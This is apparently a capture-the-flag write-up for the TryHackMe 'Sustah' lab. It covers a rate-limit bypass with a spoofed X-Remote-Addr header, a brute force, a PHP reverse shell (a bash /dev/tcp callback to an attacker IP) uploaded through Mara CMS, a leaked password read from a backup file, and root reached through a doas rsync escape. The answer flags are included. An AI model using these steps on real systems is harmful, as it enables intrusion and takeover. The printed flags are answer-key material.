----
Play a game to gain access to a vulnerable CMS. Can you beat the odds?
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/4a33e6333bd4f8d5bd80cc432c4a2287.jpeg)

### Task 1  Sustah

 Start Machine

The developers have added anti-cheat measures to their game. Are you able to defeat the restrictions to gain access to their internal CMS?

  

**_Please allow 3 minutes for the box to fully boot and the services to be available._**

  
  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.26.36 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.26.36:22
Open 10.10.26.36:80
Open 10.10.26.36:8085
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 11:54 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:54
Completed Parallel DNS resolution of 1 host. at 11:54, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:54
Scanning 10.10.26.36 [3 ports]
Discovered open port 80/tcp on 10.10.26.36
Discovered open port 22/tcp on 10.10.26.36
Discovered open port 8085/tcp on 10.10.26.36
Completed Connect Scan at 11:54, 0.20s elapsed (3 total ports)
Initiating Service scan at 11:54
Scanning 3 services on 10.10.26.36
Completed Service scan at 11:55, 6.61s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.26.36.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 5.55s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
Nmap scan report for 10.10.26.36
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-04 11:54:54 EDT for 14s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bda4a3ae66681d74e1c06aeb2b9bf333 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7zuGtMGKQdFrh6Y8Dgwdo7815klLm7VzG05KNvT112MyF41Vxz+915iRz9nTSQ583i1cmjHp+q+fMq+QGiO0iwIdYN72jop6oFxqyaO2ZjBE3grWHSP2xMsTZc7qXgPu9ZxzVAfc/4mETA8B00yc6XNApJUwfJOYz/qt/pb0WHDVBQLYesg+rrr3UZDrj9L7KNFlW74mT0nzace0yqtcV//dgOMiG8CeS6TRyUG6clbSUdr+yfgPOrcUwhTCMRKv2e30T5naBZ60e1jSuXYmQfmeZtDZ4hdsBWDfOnGnw89O9Ak+VhULGYq/ZxTh31dnWBULftw/l6saLaUJEaVeb
|   256 9adb73790c72be051a8673dcac6d7aef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENNM4XJDFEnfvomDQgg0n7ZF+bHK+/x0EYcjrLP2BGgytEp7yg7A36KajE2QYkQKtHGPamSRLzNWmJpwzaV65w=
|   256 648d5c79dee1f73f087cebb7b324641f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOd1NxUo0xJ3krpRI1Xm8KMCFXziZngofs/wjOkofKKV
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8085/tcp open  http    syn-ack Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS GET
|_http-title: Spinner
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:55
Completed NSE at 11:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.07 seconds

"What you are is what you have been. What you’ll be is what you do now."Buddha

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.26.36:8085/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.26.36:8085/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/04 12:03:38 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.26.36:8085/home                 (Status: 200) [Size: 955]
http://10.10.26.36:8085/ping                 (Status: 200) [Size: 4]


https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass

X-Remote-Addr: 127.0.0.1

hint 5 numbers ***** so 10000 to 99999 using burp intruder


POST /home HTTP/1.1

Host: 10.10.26.36:8085

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 16

Origin: http://10.10.26.36:8085

Connection: close

Referer: http://10.10.26.36:8085/home

Upgrade-Insecure-Requests: 1



number=10000


HTTP/1.1 429 TOO MANY REQUESTS

Server: gunicorn/20.0.4

Date: Tue, 04 Jul 2023 16:22:19 GMT

Connection: close

Content-Type: application/json

Content-Length: 33

X-RateLimit-Limit: 10

X-RateLimit-Remaining: 0

X-RateLimit-Reset: 1688487743

Retry-After: 3



{"error":"rate limit execeeded"}


POST /home HTTP/1.1

Host: 10.10.26.36:8085

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 8

Origin: http://10.10.26.36:8085

Connection: close

Referer: http://10.10.26.36:8085/home

Upgrade-Insecure-Requests: 1

X-Remote-Addr: 127.0.0.1



number=§10000§

search for length

number=10921

path: /YouGotTh3P@th

http://10.10.26.36/YouGotTh3P@th/

Powered by Mara cms 

http://10.10.26.36/YouGotTh3P@th/changes.txt

Mara 7.5:

Race hazard causing partial upload of media fixed. (Uploader briefly signalling 'idle' between uploads could be taken as completion on slow processor. Flag changed to 'alldone' to avoid ambiguity.) 

CK updated to 4.11.1 (4.9 also provided in case of any compatibility issues with existing sites - Just rename folders.) 

Media handing - .svg graphics file capability added. 

Added inclusion of js and css from the page head. 
 This can be turned off in siteini.php if necessary, it's the phjscss item in [site] 
 -If it's not needed, turning off will save a little on page load time and processor usage. 

https://www.exploit-db.com/exploits/48780

http://10.10.26.36/YouGotTh3P@th/lorem.php

Log in with admin and changeme to try the editor.

http://10.10.26.36/YouGotTh3P@th/lorem.php?login=admin

http://10.10.26.36/YouGotTh3P@th/codebase/dir.php?type=filenew

┌──(witty㉿kali)-[~]
└─$ cat revshell.php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'");?>

Processing file upload request...
Please be patient, may take a while.
Do not close this window whilst upload is in progress.
Destination : /var/www/html/YouGotTh3P@th/img
OK: revshell.php uploaded.
Files saved to: /var/www/html/YouGotTh3P@th/img
All files processed successfully

http://10.10.26.36/YouGotTh3P@th/img/revshell.php

┌──(witty㉿kali)-[~/.ssh]
└─$ rlwrap nc -lvp 4444                      
listening on [any] 4444 ...
10.10.26.36: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.26.36] 49346
bash: cannot set terminal process group (1230): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ which python
which python
/usr/bin/python
www-data@ubuntu-xenial:/var/www/html/YouGotTh3P@th/img$ python -c 'import pty;pty.spawn("/bin/bash")'
</www/html/YouGotTh3P@th/img$ python -c 'import pty;pty.spawn("/bin/bash")' 

www-data@ubuntu-xenial:/home/kiran$ cd /var/backups
cd /var/backups
www-data@ubuntu-xenial:/var/backups$ ls
ls
alternatives.tar.0	  dpkg.diversions.0    group.bak    shadow.bak
apt.extended_states.0	  dpkg.statoverride.0  gshadow.bak
apt.extended_states.1.gz  dpkg.status.0        passwd.bak
www-data@ubuntu-xenial:/var/backups$ cat passwd.bak
cat passwd.bak
cat: passwd.bak: Permission denied
www-data@ubuntu-xenial:/var/backups$ ls -lah
ls -lah
total 636K
drwxr-xr-x  2 root root   4.0K Dec  9  2020 .
drwxr-xr-x 14 root root   4.0K Dec  6  2020 ..
-r--r--r--  1 root root   1.7K Dec  6  2020 .bak.passwd
-rw-r--r--  1 root root    50K Dec  6  2020 alternatives.tar.0
-rw-r--r--  1 root root   6.2K Dec  9  2020 apt.extended_states.0
-rw-r--r--  1 root root    715 Dec  6  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root    509 Nov 12  2020 dpkg.diversions.0
-rw-r--r--  1 root root    207 Dec  6  2020 dpkg.statoverride.0
-rw-r--r--  1 root root   535K Dec  6  2020 dpkg.status.0
-rw-------  1 root root    849 Dec  6  2020 group.bak
-rw-------  1 root shadow  714 Dec  6  2020 gshadow.bak
-rw-------  1 root root   1.7K Dec  6  2020 passwd.bak
-rw-------  1 root shadow 1.1K Dec  6  2020 shadow.bak
www-data@ubuntu-xenial:/var/backups$ cat .bak.passwd
cat .bak.passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
kiran:x:1002:1002:trythispasswordforuserkiran:/home/kiran:

www-data@ubuntu-xenial:/var/backups$ su kiran
su kiran
Password: trythispasswordforuserkiran


kiran@ubuntu-xenial:/var/backups$ cd /home/kiran
cd /home/kiran
kiran@ubuntu-xenial:~$ ls
ls
user.txt
kiran@ubuntu-xenial:~$ cat user.txt
cat user.txt
6b18f161b4de63b5f72577c737b7ebc8

kiran@ubuntu-xenial:~$ ls -lh /usr/local/bin
ls -lh /usr/local/bin
total 68K
-rwsr-x--x 1 root root  38K Dec  6  2020 doas
-rwxr-xr-x 1 root root  221 Dec  6  2020 echo_supervisord_conf
-rwxr-xr-x 1 root root  211 Dec  6  2020 flask
-rwxr-xr-x 1 root root  220 Dec  6  2020 gunicorn
-rwxr-xr-x 1 root root  221 Dec  6  2020 pidproxy
-rwxr-xr-x 1 root root  226 Dec  6  2020 supervisorctl
-rwxr-xr-x 1 root root  224 Dec  6  2020 supervisord
-rwxr-xr-x 1 root root 1.2K Dec  6  2020 vidoas

kiran@ubuntu-xenial:~$ ls -lah /usr/local/etc/
ls -lah /usr/local/etc/
total 12K
drwxr-xr-x  2 root root 4.0K Dec  6  2020 .
drwxr-xr-x 10 root root 4.0K Nov 12  2020 ..
-rw-r--r--  1 root root   39 Dec  6  2020 doas.conf

kiran@ubuntu-xenial:~$ cat /usr/local/etc/doas.conf
cat /usr/local/etc/doas.conf
 permit nopass kiran as root cmd rsync

https://gtfobins.github.io/gtfobins/rsync/

kiran@ubuntu-xenial:~$ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
< rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null                        
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
afbb1696a893f35984163021d03f6095


```

![[Pasted image 20230704113031.png]]
![[Pasted image 20230704114523.png]]

What is the number that revealed the path?

What headers could you add to the request?

*10921*

Name the path.  

*/YouGotTh3P@th*

What is the name of CMS?  

*Mara*

What version of the CMS is running?

*7.5*

What is the user flag?

Are there any interesting backups?

*6b18f161b4de63b5f72577c737b7ebc8*

What is the root flag?

You don't always need sudo.

*afbb1696a893f35984163021d03f6095*

[[Cat Pictures 2]]